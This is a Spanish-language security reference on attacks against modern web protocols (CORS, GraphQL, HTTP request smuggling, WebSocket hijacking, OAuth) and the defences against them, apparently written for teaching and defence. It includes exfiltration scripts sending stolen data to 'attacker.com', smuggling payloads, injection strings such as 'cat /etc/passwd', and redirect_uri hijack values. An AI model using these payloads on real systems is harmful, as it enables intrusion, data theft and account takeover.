# Seguridad de protocolos Web modernos

> **Fuente**: elaborado a partir de la base de vulnerabilidades WooYun, OWASP y prácticas de seguridad de la industria, cubriendo cinco grandes superficies de ataque de protocolos Web modernos: CORS, GraphQL, HTTP request smuggling, WebSocket y OAuth.
> **Metodología**: fórmula de esencia de vulnerabilidad de WooYun + análisis sistemático L1-L4

---

## I. Configuración incorrecta de CORS

### 1.1 Esencia de la vulnerabilidad

```
Riesgo de CORS = Configuración demasiado permisiva de Access-Control-Allow-Origin × Falta de autorización adicional en interfaces sensibles
```

La política de mismo origen del navegador es en sí misma una barrera de seguridad; una configuración incorrecta de CORS la rompe, permitiendo que un sitio malicioso lea datos sensibles del usuario de forma cross-origin.

### 1.2 Métodos de detección

```bash
# Detección básica: enviar un Origin personalizado y observar la respuesta
curl -H "Origin: https://evil.com" -I https://target.com/api/userinfo
# Verificar las cabeceras de respuesta:
# Access-Control-Allow-Origin: https://evil.com  → ¡peligroso!
# Access-Control-Allow-Credentials: true          → puede llevar Cookie en peticiones cross-origin
```

**Patrones de configuración peligrosos**

| Patrón | Riesgo | Descripción |
|------|------|------|
| `Access-Control-Allow-Origin: *` | Alto | Comodín, cualquier dominio puede leer (pero sin Cookie) |
| Reflejo dinámico de Origin | Muy alto | El Origin de la petición se devuelve directamente como cabecera de respuesta |
| Se permite Origin `null` | Alto | Un `<iframe sandbox>` puede construir un origen null |
| Defecto en coincidencia por regex | Alto | `evil.com.attacker.com` coincide con `evil.com` |
| Comodín de subdominio | Medio | `*.target.com` incluye subdominios ya comprometidos |

### 1.3 Modo de explotación

```html
<!-- Página maliciosa: robo de datos de usuario cross-origin -->
<script>
fetch('https://target.com/api/userinfo', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://attacker.com/steal?data=' + JSON.stringify(d)));
</script>

<!-- Explotación con Origin null -->
<iframe sandbox="allow-scripts allow-top-navigation" src="data:text/html,
<script>
fetch('https://target.com/api/userinfo',{credentials:'include'})
.then(r=>r.text()).then(d=>parent.postMessage(d,'*'))
</script>">
</iframe>
```

### 1.4 Medidas de defensa

- **Verificación estricta de Origin mediante lista blanca**: no reflejar dinámicamente, usar una lista de coincidencia exacta
- Evitar usar `Access-Control-Allow-Origin: *` junto con `Access-Control-Allow-Credentials: true`
- Evitar permitir Origin `null`
- La coincidencia por regex debe anclarse (^ y $) para evitar bypass por coincidencia de subcadena
- Añadir autorización adicional (como CSRF Token) en interfaces sensibles, no depender únicamente de CORS

---

## II. Seguridad de GraphQL

### 2.1 Esencia de la vulnerabilidad

```
Riesgo de GraphQL = Potente capacidad de consulta × Mecanismo de introspección abierto por defecto × Falta de autorización de grano fino
```

GraphQL expone todo el modelo de datos a través de un único endpoint; el mecanismo de introspección proporciona documentación completa de la API, por lo que el atacante no necesita adivinar los endpoints.

### 2.2 Consulta de introspección - fuga de información

```graphql
# Obtener el Schema completo (tipos, campos, parámetros)
{__schema{types{name,fields{name,args{name,type{name}}}}}}

# Versión reducida: obtener solo el tipo de consulta
{__schema{queryType{name,fields{name}}}}

# Obtener la lista de mutations
{__schema{mutationType{name,fields{name,args{name}}}}}
```

### 2.3 Vectores de ataque comunes

**Ataques de inyección**

```graphql
# La concatenación de parámetros provoca inyección SQL
{ user(name: "admin' OR '1'='1") { id email } }

# Inyección NoSQL
{ user(filter: "{\"username\": {\"$gt\": \"\"}}") { id email } }
```

**DoS por consultas masivas (consultas anidadas que agotan recursos)**

```graphql
# Anidación profunda - consultas a base de datos de crecimiento exponencial
{ user(id:1) { friends { friends { friends { friends { name } } } } } }

# Consultas masivas mediante alias - enumeración de grandes volúmenes de datos en una sola petición
{ a: user(id:1){name} b: user(id:2){name} c: user(id:3){name} ... }

# Fuerza bruta mediante mutation en lote
mutation { login1: login(user:"admin",pass:"123"){token} login2: login(user:"admin",pass:"456"){token} }
```

**Bypass de autenticación**

```graphql
# La mutation carece de verificación de autorización
mutation { deleteUser(id: 1) { success } }
mutation { updateRole(userId: 1, role: "admin") { success } }
```

### 2.4 Medidas de defensa

- **Deshabilitar la consulta de introspección en producción**: verificar las peticiones `__schema`/`__type` y rechazarlas
- Límite de profundidad de consulta (se recomienda un máximo de 10 niveles) y análisis de complejidad
- Límite de tasa y timeout de consulta (contra DoS por lotes/anidación)
- Control de permisos a nivel de campo (cada resolver con su propia autorización)
- Parametrizar los parámetros de entrada (contra inyección), prohibir construir consultas mediante concatenación de cadenas
- Usar consultas persistidas (Persisted Queries), permitiendo ejecutar solo consultas preregistradas

---

## III. HTTP Request Smuggling

### 3.1 Esencia de la vulnerabilidad

```
El proxy frontend (CDN/LB) y el servidor backend interpretan de forma inconsistente los límites de una petición HTTP
→ se "contrabandea" una petición adicional dentro de una misma conexión TCP → afecta el procesamiento de peticiones de otros usuarios
```

Contradicción central: cuando `Content-Length` (CL) y `Transfer-Encoding: chunked` (TE) están presentes simultáneamente, el frontend y el backend eligen cabeceras distintas para el análisis.

### 3.2 Tres tipos de ataque

| Tipo | Análisis del frontend | Análisis del backend | Descripción |
|------|----------|----------|------|
| CL.TE | Content-Length | Transfer-Encoding | El frontend reenvía según CL, el backend interpreta según TE |
| TE.CL | Transfer-Encoding | Content-Length | El frontend reenvía según TE, el backend interpreta según CL |
| TE.TE | Transfer-Encoding | Transfer-Encoding | Se ofusca la cabecera TE para que una de las partes la ignore |

### 3.3 Payload clásico

**Smuggling CL.TE**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

**Smuggling TE.CL**

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

**Variante de ofuscación TE.TE**

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding:chunked
```

### 3.4 Detección y explotación

```
Métodos de detección:
1. Enviar una petición con conflicto CL/TE y observar timeout/respuesta anómala
2. Contrabandear una petición incompleta y ver si afecta a la siguiente petición
3. Herramienta: extensión HTTP Request Smuggler de Burp Suite

Escenarios de explotación:
- Bypass de WAF/ACL frontal → contrabandear una petición maliciosa hacia el backend
- Secuestro de peticiones de otros usuarios → robo de Cookie/Session
- Envenenamiento de caché → contrabandear una petición para contaminar el contenido cacheado en el CDN
- Secuestro de enrutamiento de peticiones → dirigir la petición hacia un backend arbitrario
```

### 3.5 Medidas de defensa

- Usar la misma librería/versión de análisis HTTP en frontend y backend
- Prohibir que aparezcan simultáneamente las cabeceras CL y TE, rechazar peticiones ambiguas
- Deshabilitar la reutilización de conexión Keep-Alive de backend en HTTP/1.0
- Actualizar a HTTP/2 (protocolo de frames binario, inmune por naturaleza a la ambigüedad CL/TE)
- Normalizar las cabeceras de la petición en el CDN/LB antes de reenviarlas

---

## IV. Seguridad de WebSocket

### 4.1 Esencia de la vulnerabilidad

```
Riesgo de WebSocket = Tras el handshake HTTP se sale del modelo de seguridad tradicional × Canal bidireccional persistente sin autorización por mensaje
```

Una vez establecida la conexión WebSocket, los mensajes posteriores ya no pasan por los mecanismos de seguridad HTTP estándar (Cookie SameSite/CSRF Token, etc.).

### 4.2 Secuestro de WebSocket entre sitios (CSWSH)

```html
<!-- Página maliciosa: secuestro de la conexión WebSocket del usuario -->
<script>
var ws = new WebSocket('wss://target.com/ws');
ws.onopen = function() {
    ws.send('{"action":"getPrivateData"}');  // enviar petición suplantando a la víctima
};
ws.onmessage = function(e) {
    // robar los datos de respuesta
    fetch('https://attacker.com/steal?data=' + encodeURIComponent(e.data));
};
</script>
```

**Principio**: el handshake de WebSocket es una petición HTTP estándar, y el navegador incluye la Cookie automáticamente. Si el servidor no valida la cabecera Origin, una página maliciosa puede establecer una conexión ws autenticada.

### 4.3 Inyección de mensajes

```javascript
// Enviar payload de inyección a través de WebSocket
ws.send('{"query": "admin\' OR 1=1--"}');          // Inyección SQL
ws.send('{"msg": "<img src=x onerror=alert(1)>"}'); // XSS
ws.send('{"cmd": "ls; cat /etc/passwd"}');           // Inyección de comandos
```

### 4.4 Autenticación insuficiente

| Problema | Riesgo | Descripción |
|------|------|------|
| Autenticación solo en el handshake | La conexión sigue válida tras expirar la Session | Una conexión ws puede durar horas |
| Sin autorización a nivel de mensaje | Cualquier cliente conectado puede ejecutar todas las operaciones | Falta de verificación de autorización per-message |
| Token transmitido en texto plano | WebSocket sin cifrar (ws://) | Usar wss:// para forzar el cifrado |

### 4.5 Medidas de defensa

- **Verificar la cabecera Origin**: comprobar si el Origin está en la lista blanca durante el handshake (contra CSWSH)
- **Autenticación mediante Token**: transmitir el Token durante el handshake vía parámetro de URL o primer mensaje (sin depender de Cookie)
- **Validación de mensajes**: aplicar validación de entrada y codificación de salida en cada mensaje (contra inyección)
- Usar wss:// para forzar el cifrado del transporte
- Implementar mecanismo de heartbeat y desconexión automática por timeout de Session
- Límite de tasa de mensajes (contra DoS)

---

## V. Seguridad de OAuth 2.0/OIDC

### 5.1 Esencia de la vulnerabilidad

```
Riesgo de OAuth = Flujo de interacción multiparte complejo × Validación de parámetros poco estricta × Implementación que se desvía de la especificación
```

El flujo de autorización de OAuth involucra la interacción de tres partes: cliente, servidor de autorización y servidor de recursos; una configuración incorrecta en cualquiera de estos eslabones puede provocar la fuga de Token o la toma de control de la cuenta.

### 5.2 Manipulación de redirect_uri

```
# Flujo normal
https://auth.target.com/authorize?response_type=code&client_id=app&redirect_uri=https://app.com/callback

# Ataque: manipular redirect_uri para robar el código de autorización
redirect_uri=https://attacker.com/steal           # Reemplazo completo
redirect_uri=https://app.com.attacker.com/callback # Confusión de subdominio
redirect_uri=https://app.com/callback/../../../attacker # Traversal de rutas
redirect_uri=https://app.com/callback?next=https://attacker.com # Cadena de redirección abierta
```

### 5.3 Vectores de ataque comunes

| Tipo de ataque | Principio | Condición de explotación |
|----------|------|----------|
| Ataque CSRF | El parámetro state falta o es predecible | Vincular la cuenta del atacante a la de la víctima |
| Fuga de Token (Referer) | En el modo implícito, el token está en el Fragment de la URL | La página contiene referencias a recursos externos |
| Fuga de Token (logs) | El código de autorización/token se registra en los logs del servidor | Los logs son accesibles |
| Bypass de PKCE | El cliente público no usa code_challenge | Basta con interceptar el código de autorización para canjear el token |
| Confusión de IdP (Mix-Up) | Confusión del origen de la respuesta de autorización en escenarios con múltiples IdP | El cliente soporta varios proveedores OAuth |
| Reproducción del código de autorización | El código de autorización no es de un solo uso | Interceptar el código de autorización y canjearlo repetidamente |

### 5.4 CSRF y el parámetro state

```
# Flujo de ataque (cuando falta state)
1. El atacante inicia la autorización OAuth y obtiene el código de autorización de su propia cuenta
2. Construye el enlace: https://app.com/callback?code=ATTACKER_CODE
3. Engaña a la víctima para que haga clic → la cuenta de la víctima se vincula a la cuenta de terceros del atacante
4. El atacante inicia sesión con su cuenta de terceros → toma el control de la cuenta de la víctima

# Defensa: parámetro state
state=valor aleatorio impredecible (vinculado a la Session del usuario)
→ al recibir el callback, verificar que state coincida con la Session
```

### 5.5 Riesgos del modo implícito

```
# Modo implícito (Implicit Flow) - ya no se recomienda
https://app.com/callback#access_token=eyJ...&token_type=bearer

Riesgos:
- El Token está en el Fragment de la URL, puede filtrarse por el historial del navegador/cabecera Referer
- No se puede usar refresh_token, mala experiencia de usuario
- No se puede vincular la identidad del cliente (sin client_secret)

→ Alternativa: Authorization Code Flow + PKCE
```

### 5.6 Medidas de defensa

- **Lista blanca estricta de redirect_uri**: coincidencia exacta (no permitir comodines/subrutas)
- **Forzar el parámetro state**: vinculado a la Session, impredecible, de un solo uso
- **Forzar PKCE**: todos los clientes (especialmente los públicos/SPA) deben usar code_challenge
- Usar Authorization Code Flow, descartar Implicit Flow
- El código de autorización de un solo uso, con vigencia corta (se recomienda dentro de 10 minutos)
- Vinculación de Token (DPoP/mTLS) para evitar el uso indebido de Token robados
- Auditar periódicamente las aplicaciones de terceros autorizadas y su alcance de permisos

---

*Elaborado a partir de la base de vulnerabilidades WooYun (88,636 registros) + estándares de seguridad OWASP/RFC | Solo para investigación de seguridad y referencia defensiva*
